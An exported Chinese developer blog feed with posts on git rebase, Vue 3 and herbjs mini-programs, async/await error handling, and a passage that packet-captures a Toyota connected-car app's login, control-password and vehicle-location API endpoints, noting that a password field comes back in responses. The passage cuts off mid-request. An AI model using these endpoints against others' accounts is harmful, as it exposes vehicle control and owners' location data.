b</code>不能是<code>s</code>，可以是<code>pick</code>或者<code>reword</code>。合并必须有一个基点，第一行就是一个基点，后续的变更合并都必须有第一行这个可合并的对象存在。</p></li><li><p>如果退出了 <code>vi</code>窗口，想要继续编辑：</p><pre class=" language-shell"><code class="language-shell">git rebase --edit-todo</code></pre></li></ol><h3 id="场景二：分支合并"><a href="#场景二：分支合并" class="headerlink" title="场景二：分支合并"></a>场景二：分支合并</h3><p><code>git merge</code> 和 <code>git rebase</code> 都可以实现分支合并。</p><p>git merge,合并之后，存在多个分支线。</p><p>![image-20201130215051796](/../../../../../Library/Application Support/typora-user-images/image-20201130215051796.png)</p><p>git rebase 合并之后，也就是上图的 <code>develop add 3.txt</code>并不会产生新的合并记录，详细过程如下：</p><ol><li><p>首先，<code>git</code> 会把 <code>develop</code> 分支里面的每个 <code>commit</code> 取消掉；</p></li><li><p>其次，把上面的操作临时保存成 <code>patch</code> 文件，存在 <code>.git/rebase</code> 目录下；</p></li><li><p>然后，把 <code>develop</code> 分支更新到最新的 <code>master</code> 分支；</p></li><li><p>最后，把上面保存的 <code>patch</code> 文件应用到 <code>develop</code> 分支上；</p><p>这也就是 <code>git rebase</code>为什么被称为 **变基 **的原因，随着主分支的发展，变基操作，只是同步了主分支的更改，在最新的主分支上面进行开发。有点类似 <code>git stash</code>, 先保存内容，等分支同步之后，再释放内容。</p></li></ol><h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>因为变基操作会直接修改历史记录，千万不要在公共分支上面使用变基操作，你应该只在你自己的分支上进行<code>git rebase</code>操作。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11 月的碎碎念</title>
      <link href="/2020/11/29/anything/jscoder/"/>
      <url>/2020/11/29/anything/jscoder/</url>
      
        <content type="html"><![CDATA[<ol><li><p>启用 jscoder.com 域名</p><p>一直对现在的域名（aocoding.com）不是非常满意，但是又没有合适的域名。最近把 jscoder.com 续费10年，长期使用。希望自己多多努力，产出文章，不负自己的 money 投入。</p></li><li><p>购入 4c8g5m 机器</p><p>前期的两台1c2g1m 小机器，给我带来了不少的快乐，然而，性能越来越满足不了我的需要。我想试试docker，想试试资源本地部署，不走cdn，这些小机器都无法满足。</p><p>现在小机器上面跑了1个爬虫，api 服务，每次ssh部署 node 服务就难受，要等待好久。</p><p>现在大机器上，部署docker，node 都很快，不要把生命浪费在等待上，该换就换，该升级就升级。机器价值是有限的，而你提供的服务是无价的：）</p></li><li><p>学习 docker</p><p>docker 大法好，docker 大法妙，docker 呱呱叫。</p><p>然鹅，部署项目时候，还是选择了宝塔面板，实在是太易用了…不要考虑那么多，无脑操作，项目就部署好了。待我 docker 再好好学一学，再考虑直接换成 docker 咯….</p><p>k8s 实在是太复杂了，项目搭建都一堆问题搞不定，算啦算啦，现在 docker-compose 已经能满足我的需求了。</p></li><li><p>miAxios 经历项目考验</p><p>封装的小程序请求库  <a href="https://github.com/Yaob1990/miniAxios#readme" target="_blank" rel="noopener">miniAxios</a>  在支付宝小程序项目中运行良好，没有严重bug。</p><p>request 库的封装，参考了 axios，axios ts 教程，等等内容，封装虽然没有什么技术含量，自己还是学到了很多东西，加深了对 ts 的理解。</p><p>后续计划：</p><ol><li>加强对多平台的支持，目前虽然是支持多平台的，但是我自己也没有完整测试过=-=。</li><li>加强 ts 类型判断，目前的 ts 在 Response 部分还是有点问题。</li><li>统一返回参数。目前的 response 是根据返回报文直接返回，后续，会归集到 response 的 data 下面，类似： res.config.data 的结构</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编码点滴 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue3 h5 脚手架</title>
      <link href="/2020/09/21/front-end/vue3-h5/"/>
      <url>/2020/09/21/front-end/vue3-h5/</url>
      
        <content type="html"><![CDATA[<p>vue 3 终于发布了正式版。</p><p>也把自己用了很久的 h5 脚手架更新了一波，所有依赖都升级到最新，后续h5开发就直接使用最新的脚手架进行开发。</p><p>后续还会增加多页面的脚手架，多页面写的真的不多，但是配置还是有点意思的~</p><p>本次脚手架，抛弃了单元测试，业务太多，真的写不过来=-=</p><p>Node-sass 换成了less，不多说，懂得自然懂….</p><p>地址：<a href="https://github.com/Yaob1990/vue3-h5" target="_blank" rel="noopener">https://github.com/Yaob1990/vue3-h5</a></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><pre><code>  1. 集成最新 `vue` 全家桶，使用 `typescript` 开发  2. 路由使用 hash 模式，方便部署  3. `axios` 封装，暴露常用的 `get` `post` 方法  4. `axios` 封装，避免多重 `loading` 的问题，并提供接口配置项  5. 使用 less ，提供基础的`mixin`，并作为全局css，方便使用  6. 异步加载 `vconsole`，线上环境，无需手动去除，不会打入主包，不会引起包体积增大  7. ui 框架选择 `vant`，按需引入  8. `npm run report` 分析构建包的大小  9. 线上版本去除 console.log，debugger 等调试内容</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>herbjs 简明数据流</title>
      <link href="/2020/08/16/front-end/leran-herbjs/"/>
      <url>/2020/08/16/front-end/leran-herbjs/</url>
      
        <content type="html"><![CDATA[<p>最近在使用<code>herbjs</code>做支付宝小程序的开发，在熟悉了开发模式之后，还是挺好用的。</p><h3 id="小程序运行机制"><a href="#小程序运行机制" class="headerlink" title="小程序运行机制"></a>小程序运行机制</h3><p>写小程序的感觉，更像是在写ract，然而这两者的机制是不一样的。</p><p>小程序的框架包含两部分View视图层(可能存在多个)、App Service逻辑层(一个)，View层用来渲染页面结构，AppService层用来逻辑处理、数据请求、接口调用，它们在两个线程里运行。</p><p>视图层使用WebView渲染，逻辑层使用JSCore运行。</p><p>视图层和逻辑层通过系统层的JsBridage进行通信，逻辑层把数据变化通知到视图层，触发视图层页面更新，视图层把触发的事件通知到逻辑层进行业务处理。</p><img src="/images/image-20200816164049483.png" alt="image-20200816164049483" style="zoom:50%;" /><p>小程序的<code>setData</code>并不是实时的，而是需要两个线程通过 <code>JsBridge</code> 进行通信完成，在性能优化方面，需要考虑：</p><ol><li>避免频繁的 <code>setData</code>，容易造成卡顿，渲染出现延迟</li><li>避免<code>setData</code>频繁传递大量数据</li><li>避免后台页面<code>setData</code>,用户无法感知，会抢占前台页面的执行</li></ol><h3 id="herbjs-与原生开发框架相比"><a href="#herbjs-与原生开发框架相比" class="headerlink" title="herbjs 与原生开发框架相比"></a>herbjs 与原生开发框架相比</h3><p>原生框架数据以page为单位，进行管理。</p><p>herbjs 吸收了 vuex 的精华，给小程序增加了，全局 store，页面store，等一系列的 vuex 功能。还支持 <code>typescript</code>,<code>插件体系</code>等功能。</p><p>区别于 <code>uni-app</code>,<code>taro</code>,这些框架，herbjs 并没有修改小程序本身的逻辑，原有的生命周期都还在，原有的写法也都适用，更多的可以看成是原生小程序的增强版。</p><p>个人觉得，<code>简明的数据流</code>是这个框架最优雅的地方，方便大量 vue 开发者快速上手开发。</p><p>官方文档: <a href="https://www.yuque.com/herbjs/doc" target="_blank" rel="noopener">https://www.yuque.com/herbjs/doc</a></p><p>官方文档，其实说的已经比较明白了，值得多看几遍。</p><h3 id="简明数据流"><a href="#简明数据流" class="headerlink" title="简明数据流"></a>简明数据流</h3><p>项目地址：<a href="https://github.com/Yaob1990/leran_herbjs" target="_blank" rel="noopener">https://github.com/Yaob1990/leran_herbjs</a></p><h4 id="页面级别数据流"><a href="#页面级别数据流" class="headerlink" title="页面级别数据流"></a>页面级别数据流</h4><p>页面中，通过 <code>setData</code>数据</p><pre class=" language-typescript"><code class="language-typescript">Page<span class="token operator">&lt;</span>IPageState<span class="token punctuation">,</span> IPageMethods<span class="token punctuation">,</span> IPageStore<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token function">onLoad</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span>    num<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">plus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      num<span class="token punctuation">:</span> <span class="token operator">++</span><span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>num<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">minus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      num<span class="token punctuation">:</span> <span class="token operator">--</span><span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>num<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="组件中数据流"><a href="#组件中数据流" class="headerlink" title="组件中数据流"></a>组件中数据流</h4><p>外部传入参数，注意如果是监听事件必须是<code>on</code>开头</p><pre class=" language-typescript"><code class="language-typescript">Component<span class="token operator">&lt;</span>IComponentData<span class="token punctuation">,</span> IComponentProps<span class="token punctuation">,</span> IComponentMethods<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  mapStateToData<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span>    text<span class="token punctuation">:</span> <span class="token string">'component'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  props<span class="token punctuation">:</span> <span class="token punctuation">{</span>    onPlus<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    onMinus<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">didMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">didUnmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token function">plus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onPlus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">minus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onMinus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>组件使用：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">onPlus</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>plus<span class="token punctuation">"</span></span> <span class="token attr-name">onMinus</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>minus<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span></code></pre><h4 id="页面-store-数据流"><a href="#页面-store-数据流" class="headerlink" title="页面 store 数据流"></a>页面 store 数据流</h4><pre class=" language-typescript"><code class="language-typescript">Page<span class="token operator">&lt;</span>IPageData<span class="token punctuation">,</span> IPageMethods<span class="token punctuation">,</span> IPageStore<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token function">plus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'plus'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">minus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'minus'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">multiply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'multiplyAsync'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>store 部分</p><pre class=" language-typescript"><code class="language-typescript">Store<span class="token operator">&lt;</span>IPageState<span class="token punctuation">,</span> IPageGetters<span class="token punctuation">,</span> IPageMutations<span class="token punctuation">,</span> IPageActions<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">{</span>  state<span class="token punctuation">:</span> <span class="token punctuation">{</span>    num<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 全局 Getter 可以被 App、Page、Component 都能访问到</span>  <span class="token comment" spellcheck="true">// 页面 Getter 只能被当前 Page 和 当前 Page 内的 Component 访问到</span>  getters<span class="token punctuation">:</span> <span class="token punctuation">{</span>    desc<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> state<span class="token punctuation">,</span> getters <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>state<span class="token punctuation">.</span>num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'正值'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>state<span class="token punctuation">.</span>num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'负值'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'零'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  mutations<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token function">plus</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token operator">++</span>state<span class="token punctuation">.</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">minus</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token operator">--</span>state<span class="token punctuation">.</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">multiply</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>      state<span class="token punctuation">.</span>num <span class="token operator">=</span> state<span class="token punctuation">.</span>num <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  actions<span class="token punctuation">:</span> <span class="token punctuation">{</span>    async <span class="token function">multiplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">{</span> state<span class="token punctuation">,</span> commit<span class="token punctuation">,</span> dispatch <span class="token punctuation">}</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'multiply'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="全局-store"><a href="#全局-store" class="headerlink" title="全局 store"></a>全局 store</h4><p>全局 store 和页面类似，只是多一个 <code>$global</code>参数，详见文档。</p><h3 id="开发体会"><a href="#开发体会" class="headerlink" title="开发体会"></a>开发体会</h3><p>小程序的开发框架百花齐放，uni-app，taro，mpvue。</p><p>然而，自己也只是停留在会用的程度，没有再去想一想为什么可以这样编译，内部的原理。这阶段的工作估计会长期和小程序打交道，希望自己能够深入的研究小程序的背后逻辑，而不仅仅会用就行。</p><p>道阻且长，同志加油。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 支付宝小程序,herbjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async await 的终极封装</title>
      <link href="/2020/08/06/front-end/async-await/"/>
      <url>/2020/08/06/front-end/async-await/</url>
      
        <content type="html"><![CDATA[<h2 id="async-await-的终极封装"><a href="#async-await-的终极封装" class="headerlink" title="async await 的终极封装"></a>async await 的终极封装</h2><p>在看同事代码时候，看到下面这一段，有点意思。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">[</span>res<span class="token punctuation">,</span>error<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 错误处理</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 业务处理</span></code></pre><p>注意，这里代码没有使用try catch，而是把错误处理封装成了数组形式。</p><p>继续，看看他的代码是怎么写的：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">promieWapper</span><span class="token punctuation">(</span>promise<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">[</span>res<span class="token punctuation">,</span> undefined<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">[</span>undefined<span class="token punctuation">,</span> err<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>getList <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">promieWapper</span><span class="token punctuation">(</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看起来也不是很复杂，就是在promise 外面在套一层promise，返回结果，放到一个数组中。</p><p>很巧妙的实现了，错误的处理，使用时候，直接进行数组的判断，不需要去写丑陋的 try catch</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>仔细看一下上面的代码，其实有点小问题，内部返回的就是promise，还有必要再嵌套一层 promise ？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">promieWapper</span><span class="token punctuation">(</span>promise<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>res<span class="token punctuation">,</span> undefined<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      retirn <span class="token punctuation">[</span>undefined<span class="token punctuation">,</span> err<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这样写感觉更清爽一点， then 返回的部分也还是 promise，异常也会被 catch 捕获到。</p><h2 id="添加函数类型（ts）"><a href="#添加函数类型（ts）" class="headerlink" title="添加函数类型（ts）"></a>添加函数类型（ts）</h2><pre class=" language-typescript"><code class="language-typescript">async <span class="token keyword">function</span> promieWapper<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> U <span class="token operator">=</span> Error<span class="token operator">></span><span class="token punctuation">(</span>promise<span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span><span class="token punctuation">[</span>U<span class="token punctuation">,</span> undefined<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span> T<span class="token punctuation">]</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> promise<span class="token punctuation">.</span>then<span class="token operator">&lt;</span><span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span> T<span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>U<span class="token punctuation">,</span> undefined<span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">:</span> U<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>error<span class="token punctuation">,</span> undefined<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>node 中一般 Error 会放在第一个参数位置，这里参考 node 优先处理错误。</p><h2 id="3年前…"><a href="#3年前…" class="headerlink" title="3年前…"></a>3年前…</h2><p>我觉得我同事牛逼极了，能想出这么天才的方法！</p><p>直到我看到了这个库：<a href="https://github.com/scopsy/await-to-js" target="_blank" rel="noopener">await-to-js</a></p><p>上面的最终写法，也是参考了这个库。这个库 2.3m/month 的下载量，还是3年前写的，写好基本没有更新过，真牛逼！</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>丰云行app 探索</title>
      <link href="/2020/06/17/front-end/fyx/"/>
      <url>/2020/06/17/front-end/fyx/</url>
      
        <content type="html"><![CDATA[<p>广汽丰田的风云行app，提供的车联网功能还是挺好用的，但是只能提供车辆的位置信息，不能提供行驶轨迹等功能。于是抓包看了下他的功能逻辑。</p><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 登录地址（post）：</span>https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>carapp<span class="token punctuation">.</span>gtmc<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>api<span class="token operator">/</span>appgtmc<span class="token operator">/</span>reg<span class="token operator">/</span>action<span class="token operator">/</span>AppUserInfoAction<span class="token operator">/</span>appUserLogin<span class="token punctuation">.</span>json<span class="token comment" spellcheck="true">// 参数（body）</span>accessToken<span class="token operator">=</span><span class="token operator">&amp;</span>appVersion<span class="token operator">=</span><span class="token number">4.3</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">&amp;</span>checkCode<span class="token operator">=</span><span class="token operator">&amp;</span>deviceId<span class="token operator">=</span><span class="token operator">&amp;</span>deviceType<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>distinctId<span class="token operator">=</span><span class="token operator">&amp;</span>loginType<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token operator">&amp;</span>phoneName<span class="token operator">=</span><span class="token operator">&amp;</span>phoneNumber<span class="token operator">=</span><span class="token operator">&amp;</span>pushId<span class="token operator">=</span></code></pre><p>返回值：</p><pre><code>{    &quot;data&quot;: {        &quot;jwt&quot;: &quot;&quot;,        &quot;rData&quot;: {            &quot;birthday&quot;: &quot;&quot;,            &quot;passWord&quot;: &quot;111&quot;,            &quot;communtiyFlag&quot;: &quot;0&quot;,            &quot;dealerName&quot;: &quot;&quot;,            &quot;address&quot;: &quot;&quot;,            &quot;kickOut&quot;: true,            &quot;dealerCode&quot;: &quot;&quot;,            &quot;sex&quot;: &quot;null&quot;,            &quot;resultCode&quot;: &quot;&quot;,            &quot;description&quot;: &quot;&quot;,            &quot;userId&quot;: 111,            &quot;uuid&quot;: &quot;111&quot;,            &quot;telPhone&quot;: &quot;111&quot;,            &quot;name&quot;: &quot;1&quot;,            &quot;status&quot;: &quot;0&quot;,            &quot;username&quot;: &quot;11&quot;        }    },    &quot;success&quot;: true,    &quot;resultCode&quot;: 200,    &quot;elapsedMilliseconds&quot;: 0}</code></pre><p>jwt 就是登录凭证，有了这个登录凭证后续的请求都可以进行鉴权。</p><p>这里后端返回了<code>passWord</code>字段，个人觉得非常不合适。后端要么是直接返回的用户数据，要么就没有做非对称加密，直接数据库解码出用户的密码字段！通过网络劫持，很容易就嗅探出用户的密码了。</p><p>给广汽的邮箱和微信反应过这个问题，没有得到任何回应….</p><h3 id="控制密码校验"><a href="#控制密码校验" class="headerlink" title="控制密码校验"></a>控制密码校验</h3><pre><code>// get 请求https://carapp.gtmc.com.cn/api/vhcApp/controlpwd/checkControlPwd?phone=&amp;pwd=// header Authorization:{{jwt}}</code></pre><p>通过用户的手机号码和控制密码,jwt校验,进行用户身份识别.</p><p>返回:</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span>    <span class="token string">"resultCode"</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>    <span class="token string">"errMsg"</span><span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token string">"elapsedMilliseconds"</span><span class="token punctuation">:</span> <span class="token number">35</span><span class="token punctuation">,</span>    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span></code></pre><p><code>code:1</code> 校验通过,经过测试,这个校验状态的有效期约为三分钟</p><h3 id="获取车辆位置"><a href="#获取车辆位置" class="headerlink" title="获取车辆位置"></a>获取车辆位置</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// get 请求(vin 